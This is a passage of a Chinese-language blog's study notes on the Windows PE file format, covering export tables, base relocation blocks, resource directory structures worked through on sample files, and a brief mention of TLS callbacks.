&#x2F;&#x2F;起始序数值，正常为1，查询输出函数时，将该值减去，得到进入EAT的索引 DWORD NumberOfFunctions; &#x2F;&#x2F;EAT中的条目数量 DWORD NumberOfNames; &#x2F;&#x2F;ENT表中的条目数量 DWORD AddressOfFunctions; &#x2F;&#x2F; EAT的RVA DWORD AddressOfNames; &#x2F;&#x2F; ENT的RVA DWORD AddressOfNameOrdinals; &#x2F;&#x2F; 输出序数表的RVA } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; ::: 这里加两个名称，输出地址表（EAT），输出函数名称表（ENT） 输出表实例分析先根据数据目录表的第一个元素，78h知道偏移位置，再根据PE文件头起始位置是100h，所以去看178h 这里是00 40 00 00，倒过来就是00 00 40 00-&gt;0C00h 这个就是输出表的内容了 Name：在00004032h-&gt;C32h处，可以看到是DLLDemo.DLL AddressOfNames：在0000402Ch-&gt;C2Ch处，可以看到是0000403E，是个指针，再跟着去看C3Eh，MsgBox函数名 AddressOfNameOrdinals：在4030h处也就是C30h，00 00代表输出序号数组 PE装载器调用GetProcAddress来查找DLLDemo.DLL里的API函数MsgBox，系统通过这个结构（IMAGE_EXPORT_DIRECTORY）来获得ENT的起始地址，然后通过二进制查找，知道发现目标函数的字符串，最后用输出序数，进入EAT找到目标函数的RVA最后得到地址 基址重定位基址重定义的概念这个好理解，就是把可能需要改变的地址提前存在一个数组里，等真的要改变基地址的时候（比如程序的基地址在00400000h，DLL载入一般在00870000h）去计算新的 那么有可能改变的是什么呢？就是如下这种 :::successjmp 00401020 call 00402210 ::: 这样子的地址，如果他的基地址是00400000h的话，这个可以成立，但是如果是00870000h呢？所以到时候就会被标注改成对应的跳转，如下图 基址重定位表的结构基址重定位表位于**.reloc**块中 数据目录表的IMAGE_DIRECTORY_ENTRY_BASERELOC条目记录了他的位置 基址重定位数据采用类似按页分割的方法组织，是由许多重定位块串接成的 IMAGE_BASE_RELOCATION结构开始 :::successIMAGE_BASE_RELOCATION STRUCT DWORD VirtualAddress; &#x2F;&#x2F;这一组重定位数据的开始RVA，各重定向的地址必须加上这个RVA才是重 定向的完整RVA DWORD SizeOfBlock; &#x2F;&#x2F;当前重定位结构的大小 IMAGE_BASE_RELOCATION ENDS WORD TypeOffset[1]; &#x2F;&#x2F;数组，分高4位和低12位，高4位代表重定位类型，低12位代表重定位地址 &#x2F;&#x2F;该地址与VirtualAddress相加，就得到需要修改数据的地址的指针 ::: 基址重定位表实例分析以DllDemo.DLL为例分析，数据目录表指向重定位表的指针是00005000h-&gt;00000E00h VirtualAddress SizeOfBlock TypeOffset[]（两字节大小） 以第一个为例试试，300F，高四位是3，所以是类型3，低十二位是00F,也就是说第一个需要改动的是00001000h+000000Fh&#x3D;100Fh-&gt;60Fh 资源资源结构 资源目录结构 IMAGE_RESOURCE_DIRECTORY数据目录表中的IMAGE_DIRECTORY_ENTRY_RESOUCE包含资源的RVA和大小 资源目录结构中的每一个节点都是由IMAGE_RESOURCE_DIRECTORY结构和紧随其后的数个IMAGE_RESOURCE_DICETORY_ENTRY结构组成的，这两种结构组成了一个数据块 IMAGE_RESOURCE_DIRECTORY一般16字节，定义如下 :::successtypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; WORD NumberOfNamedEntries; &#x2F;&#x2F;以字符串命名的资源数量 WORD NumberOfIdEntries; &#x2F;&#x2F;以整形数字命令的资源数量 &#x2F;&#x2F; IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; ::: NumberOfNamedEntries和NumberOfIdEntries加起来是本目录的目录项总和 资源目录入口结构 IMAGE_RESOURCE_DICETORY_ENTRY紧跟资源目录结构的是资源目录入口结构 IMAGE_RESOURCE_DICETORY_ENTRY，长度8字节，包含两个字段 :::successIMAGE_RESOURCE_DIRECTORY_ENTRY STRUCT DWORD Name &#x2F;&#x2F;目录项的名称字符串指针或ID DWORD OffsetToData &#x2F;&#x2F;资源数据偏移地址或子目录偏移地址 IMAGE_RESOURCE_DIRECTORY_ENTRY ENDS ::: Name： * 当结构用于第1层目录时，定义的是资源类型 * 当结构用于第2层目录时，定义的是资源的名称 * 当结构用于第3层目录时，定义的是代码页编号 * 当最高值为0时，当ID用 * 当最高值为1时，低位为指针，资源名称字符串使用**Unicode**编码，指针指向的是**IMAGE_RESOUCE_DIR_STRING_U**结构定义如下 :::successIMAGE_RESOUCE_DIR_STRING_U STRUCT WORD Length &#x2F;&#x2F;字符串的长度 WCHAR NameString &#x2F;&#x2F;Unicode字符串，按字对齐长度可变 &#x2F;&#x2F;由Length指明Unicode字符串的长度 IMAGE_RESOUCE_DIR_STRING_U ENDS ::: OffsetToData： * 当最高位为1时，低位数据指向下一层目录块的起始位置 * 当最高位为0时，指针指向**IMAGE_RESOURCE_DATA_ENTRY**结构 注意：Name与OffsetData作为指针的时候，偏移量从资源区块开始算起，而不是RVA（根目录的起始位置）开始 资源数据入口 IMAGE_RESOURCE_DATA_ENTRY经过三层IMAGE_RESOURCE_DICETORY_ENTRY（一般是），第三层目录结构中OffsetToData一般指向IMAGE_RESOURCE_DATA_ENTRY，该结构描述了资源数据的位置和大小，其定义如下 :::successIMAGE_RESOURCE_DATA_ENTRY STRUCT DOWRD OffsetToData &#x2F;&#x2F;资源数据的RVA DOWRD Size &#x2F;&#x2F;资源数据的长度 DOWRD CodePage &#x2F;&#x2F;代码页，一般为0 DOWRD Reserved &#x2F;&#x2F;保留字段 IMAGE_RESOURCE_DATA_ENTRYENDS ::: 经过多层结构，这里的IMAGE_RESOURCE_DATA_ENTRY结构就是真正的资源数据了，OffsetToData指向资源数据的指针 资源结构实例分析实例：pediy.exe 数据目录表第三个成员指向资源结构，该指针具体位置在PE文件头的88h处 该文件PE文件头起始位置为0C0h，所以去看0C0h+88h&#x3D;148h 是“00 40 00 00”-&gt;00004000h，因为本文件对齐值为1000h，所以直接看4000h即可 这里再捋一遍，IMAGE_DIRECTORY_ENTRY_RESOUCE（资源目录结构）后面会跟着很多IMAGE_RESOURCE_DICETORY_ENTRY（资源目录入口结构），在资源目录入口结构中的OffsetToData会指向下一层目录，如此往返 根目录根据结构IMAGE_DIRECTORY_ENTRY_RESOUCE 第一层目录中，第二个IMAGE_RESOURCE_DICETORY_ENTRY结构中Name定义为类型，ID为04h，所以是菜单，在根据OffsetToData找到下一级目录，首先OffsetToData字段80000040第一个字节80h的二进制码 这里后面的内容是重复的，只需要注意每层目录的IMAGE_RESOURCE_DICETORY_ENTRY里的Name定义即可 资源编辑工具资源数据一般存储在PE文件的.rsrc区块中，而且不能通过由程序源代码定义的变量直接访问 资源类型主要有一下三种 - VC类标准资源：包括菜单、对话框、串表等资源 - Delphi类标准资源：Rcdata资源 - 非标准的Unicode字符：主要是一些VB编译程序等 对这些资源可以进行定制和修改，例如更改字体，对话框，增加按钮、菜单等 TISTLS是各线程的独立的数据存储空间，使用TLS技术可在线程内部独立使用 TLS回调函数每当创建&#x2F;终止进程的线程时会自动调用执行的函数","updated":"2025-10-08T10:03:47.048Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"windows深度学习","slug":"windows深度学习","permalink":"https://l1pmoluy.github.io/tags/windows%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]}],"categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"},{"name":"ctf","slug":"ctf","permalink":"https://l1pmoluy.github.io/categories/ctf/"}],"tags":[{"name":"项目","slug":"项目","permalink":"https://l1pmoluy.github.io/tags/%E9%A1%B9%E7%9B%AE/"},{"name":"wp","slug":"wp","permalink":"https://l1pmoluy.github.io/tags/wp/"},{"name":"windows深度学习","slug":"windows深度学习","permalink":"https://l1pmoluy.github.io/tags/windows%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]}